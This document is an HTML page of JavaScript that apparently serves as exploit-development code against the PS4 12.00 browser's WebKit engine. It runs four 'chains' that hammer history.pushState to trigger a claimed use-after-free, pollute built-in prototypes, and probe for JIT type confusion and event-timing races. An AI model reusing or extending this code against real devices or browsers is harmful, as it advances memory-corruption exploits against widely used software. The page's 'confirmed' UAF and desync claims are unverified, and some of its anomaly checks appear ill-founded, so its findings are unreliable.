<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Temporal Desync Exploitation</title>
</head>
<body>
<h2>PS4 12.00 - Temporal Desync + Pollution Chain</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="testPopstateRace()">CHAIN 1 - Popstate Event Race</button>
<button onclick="testClosureLifetime()">CHAIN 2 - Closure Lifetime Confusion</button>
<button onclick="testPollutionJIT()">CHAIN 3 - Pollution â†’ JIT Confusion</button>
<button onclick="testEventListenerTiming()">CHAIN 4 - Multiple Event Timing</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// INVARIANTES (NÃƒO ALTERAR)
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

var globalState = {
  captured: [],
  anomalies: []
};

// =====================================================
// CHAIN 1 - Popstate Event Race Condition
// =====================================================
async function testPopstateRace(){
  logEl.textContent = "";
  globalState = { captured: [], anomalies: [] };
  statusEl.textContent = "Testing Popstate Race...";
  
  log("=== CHAIN 1: Popstate Event Race ===\n");
  log("Goal: Exploit temporal window via popstate events\n");
  
  // Setup pollution
  log("[SETUP] Prototype pollution active");
  Array.prototype.raceFlag = 0xDEADC0DE;
  Object.prototype.temporal = true;
  
  // Setup popstate listener
  let popstateCount = 0;
  let capturedStates = [];
  
  window.addEventListener('popstate', (e) => {
    popstateCount++;
    
    let snapshot = {
      count: popstateCount,
      state: e.state ? JSON.stringify(e.state).slice(0, 100) : null,
      historyLen: history.length,
      pollution: e.state && e.state.data ? e.state.data.raceFlag : null,
      timestamp: Date.now()
    };
    
    capturedStates.push(snapshot);
    
    log(`  ðŸ”¥ POPSTATE #${popstateCount}: histLen=${snapshot.historyLen}, pollution=0x${(snapshot.pollution || 0).toString(16)}`);
    
    // Critical: Try to manipulate during event
    if(popstateCount >= 5 && popstateCount <= 8) {
      try {
        // Attempt reentrant pushState during popstate
        history.pushState({
          injected: true,
          during: 'popstate',
          count: popstateCount
        }, "", "#injection");
        
        log(`    â†’ Injected state during popstate!`);
        globalState.anomalies.push('reentrant_push');
        
      } catch(e) {
        log(`    â†’ Injection blocked: ${e.message}`);
      }
    }
  });
  
  log("  Popstate listener registered\n");
  
  // Trigger UAF
  log("[PHASE 1] Triggering UAF with polluted environment");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [1, 2, 3, 4]
    };
    
    let frag = "R".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n  UAF complete\n");
  
  await sleep(200);
  
  // Navigate to trigger popstates
  log("[PHASE 2] Triggering popstate events");
  
  for(let i=0; i<10; i++) {
    history.back();
    await sleep(30);
  }
  
  await sleep(200);
  
  log(`\n[RESULT] Popstate events: ${popstateCount}`);
  log(`Captured states: ${capturedStates.length}`);
  log(`Anomalies: ${globalState.anomalies.length}\n`);
  
  // Analyze
  let withPollution = capturedStates.filter(s => s.pollution === 0xDEADC0DE);
  log(`States with pollution: ${withPollution.length}`);
  
  if(withPollution.length > 0) {
    log("\nâœ“ Pollution survived through popstate!");
  }
  
  if(globalState.anomalies.includes('reentrant_push')) {
    log("\nðŸš¨ CRITICAL: Reentrant pushState during popstate!");
    log("Temporal desync exploitation confirmed!");
    statusEl.textContent = "RACE CONDITION FOUND";
  }
  
  // Cleanup
  delete Array.prototype.raceFlag;
  delete Object.prototype.temporal;
  
  log("\n=== CHAIN 1 END ===");
}

// =====================================================
// CHAIN 2 - Closure Lifetime Confusion
// =====================================================
async function testClosureLifetime(){
  logEl.textContent = "";
  globalState = { captured: [], anomalies: [] };
  statusEl.textContent = "Testing Closure Lifetime...";
  
  log("=== CHAIN 2: Closure Lifetime Confusion ===\n");
  log("Goal: Exploit cross-layer lifetime via closures\n");
  
  // Pollution
  Function.prototype.lifetimeMarker = 0xC105ED;
  
  log("[SETUP] Creating closure chain");
  
  let outerScope = {
    counter: 0,
    captured: []
  };
  
  function createClosure(iter) {
    let localData = {
      iteration: iter,
      timestamp: Date.now()
    };
    
    return function() {
      outerScope.counter++;
      outerScope.captured.push(localData);
      
      // Try to access pollution
      if(this.lifetimeMarker) {
        log(`    Closure fired with pollution: 0x${this.lifetimeMarker.toString(16)}`);
        globalState.anomalies.push('closure_pollution');
      }
      
      return localData.iteration;
    };
  }
  
  log("  Closure factory created\n");
  
  // Trigger UAF with closures
  log("[PHASE 1] UAF with closure-based states");
  
  let closures = [];
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let closure = createClosure(i);
    closures.push(closure);
    
    let state = {
      index: i,
      callback: closure,
      data: [i, i*2, i*3]
    };
    
    let frag = "C".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n  UAF complete\n");
  
  await sleep(200);
  
  // Execute closures post-UAF
  log("[PHASE 2] Executing closures after UAF");
  
  for(let i=0; i<10; i++) {
    history.back();
    await sleep(30);
    
    if(history.state && history.state.callback) {
      try {
        let result = history.state.callback();
        log(`  Closure ${i} returned: ${result}`);
        
        // Check if closure accessed freed data
        if(result !== history.state.index) {
          log(`    âš ï¸ Mismatch: expected ${history.state.index}, got ${result}`);
          globalState.anomalies.push('closure_mismatch');
        }
        
      } catch(e) {
        log(`  Closure ${i} error: ${e.message}`);
        globalState.anomalies.push('closure_crash');
      }
    }
  }
  
  log(`\n[RESULT] Outer counter: ${outerScope.counter}`);
  log(`Captured data: ${outerScope.captured.length}`);
  log(`Anomalies: ${globalState.anomalies.length}`);
  
  if(globalState.anomalies.includes('closure_pollution')) {
    log("\nâœ“ Closure accessed polluted prototype!");
  }
  
  if(globalState.anomalies.includes('closure_mismatch')) {
    log("\nðŸš¨ CRITICAL: Closure data mismatch!");
    log("Lifetime confusion confirmed!");
    statusEl.textContent = "LIFETIME CONFUSION FOUND";
  }
  
  delete Function.prototype.lifetimeMarker;
  
  log("\n=== CHAIN 2 END ===");
}

// =====================================================
// CHAIN 3 - Pollution + JIT Type Inference
// =====================================================
async function testPollutionJIT(){
  logEl.textContent = "";
  globalState = { captured: [], anomalies: [] };
  statusEl.textContent = "Testing Pollution+JIT...";
  
  log("=== CHAIN 3: Pollution â†’ JIT Type Confusion ===\n");
  log("Goal: Use pollution to break JIT type inference\n");
  
  // Aggressive pollution
  Array.prototype.length = 0x1000;
  Array.prototype[100] = 0xBADC0DE;
  
  log("[SETUP] JIT-compiled function with polluted arrays");
  
  function hotFunction(arr) {
    let sum = 0;
    // JIT will inline and optimize this
    for(let i=0; i<arr.length && i<10; i++) {
      sum += arr[i] | 0;
    }
    return sum;
  }
  
  // Force JIT compilation
  log("[PHASE 1] JIT training (10k iterations)");
  
  for(let i=0; i<10000; i++) {
    hotFunction([1, 2, 3, 4, 5]);
  }
  
  log("  JIT compiled\n");
  
  // Trigger UAF with polluted arrays
  log("[PHASE 2] UAF with polluted array states");
  
  let size = BASE;
  let results = [];
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      victim: [10, 20, 30, 40, 50]
    };
    
    let frag = "J".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n  UAF complete\n");
  
  await sleep(200);
  
  // Call JIT function with post-UAF arrays
  log("[PHASE 3] Calling JIT with post-UAF arrays");
  
  for(let i=0; i<5; i++) {
    history.back();
    await sleep(30);
    
    if(history.state && history.state.victim) {
      try {
        let result = hotFunction(history.state.victim);
        results.push(result);
        
        log(`  JIT call ${i}: result=${result} (expected 150)`);
        
        if(result !== 150) {
          log(`    ðŸš¨ ANOMALY: ${result}`);
          globalState.anomalies.push({type: 'jit_anomaly', value: result});
        }
        
      } catch(e) {
        log(`  JIT call ${i}: EXCEPTION - ${e.message}`);
        globalState.anomalies.push({type: 'jit_crash', msg: e.message});
      }
    }
  }
  
  log(`\n[RESULT] JIT calls: ${results.length}`);
  log(`Anomalies: ${globalState.anomalies.length}`);
  
  if(globalState.anomalies.length > 0) {
    log("\nðŸš¨ JIT TYPE CONFUSION DETECTED!");
    
    globalState.anomalies.forEach(a => {
      if(a.type === 'jit_anomaly') {
        log(`  Anomalous result: ${a.value}`);
      } else if(a.type === 'jit_crash') {
        log(`  JIT crash: ${a.msg}`);
      }
    });
    
    statusEl.textContent = "JIT CONFUSION FOUND";
  }
  
  delete Array.prototype.length;
  delete Array.prototype[100];
  
  log("\n=== CHAIN 3 END ===");
}

// =====================================================
// CHAIN 4 - Multiple Event Listener Timing
// =====================================================
async function testEventListenerTiming(){
  logEl.textContent = "";
  globalState = { captured: [], anomalies: [] };
  statusEl.textContent = "Testing Event Timing...";
  
  log("=== CHAIN 4: Multiple Event Timing ===\n");
  log("Goal: Exploit timing between multiple event types\n");
  
  // Pollution
  Event.prototype.temporal = 0xE7E47;
  
  // Setup multiple listeners
  let events = {
    popstate: 0,
    hashchange: 0,
    beforeunload: 0
  };
  
  window.addEventListener('popstate', () => {
    events.popstate++;
    log(`  ðŸ”µ popstate #${events.popstate}`);
    
    if(events.popstate === 3) {
      // Try to cause race
      location.hash = "#race" + Date.now();
    }
  });
  
  window.addEventListener('hashchange', () => {
    events.hashchange++;
    log(`  ðŸŸ¢ hashchange #${events.hashchange}`);
    
    if(events.hashchange === 2) {
      try {
        history.pushState({race: true}, "", "#timing");
        globalState.anomalies.push('hashchange_push');
      } catch(e) {}
    }
  });
  
  log("[SETUP] Multiple event listeners registered\n");
  
  // Trigger UAF
  log("[PHASE 1] UAF trigger");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: {value: i * 100}
    };
    
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n  UAF complete\n");
  
  await sleep(200);
  
  // Trigger events
  log("[PHASE 2] Triggering event cascade");
  
  for(let i=0; i<8; i++) {
    history.back();
    await sleep(40);
    
    if(i % 2 === 0) {
      location.hash = "#event" + i;
      await sleep(20);
    }
  }
  
  await sleep(300);
  
  log(`\n[RESULT] Event counts:`);
  log(`  popstate: ${events.popstate}`);
  log(`  hashchange: ${events.hashchange}`);
  log(`  Anomalies: ${globalState.anomalies.length}`);
  
  if(globalState.anomalies.includes('hashchange_push')) {
    log("\nðŸš¨ CRITICAL: pushState during hashchange!");
    log("Event timing race confirmed!");
    statusEl.textContent = "EVENT RACE FOUND";
  }
  
  delete Event.prototype.temporal;
  
  log("\n=== CHAIN 4 END ===");
}

log("PS4 12.00 - Temporal Desync + Pollution Chains");
log("\nRespecting confirmed invariants:");
log("- UAF in HistoryController (WebCore layer)");
log("- NOT reclaimable by JS heap");
log("- Temporal desync confirmed");
log("- Prototype pollution confirmed");
log("\nChains:");
log("1. Popstate Race - reentrant during event");
log("2. Closure Lifetime - cross-layer confusion");
log("3. Pollution+JIT - break type inference");
log("4. Event Timing - multiple event race");
log("\nLooking for second bug via temporal exploitation");
</script>
</body>
</html>
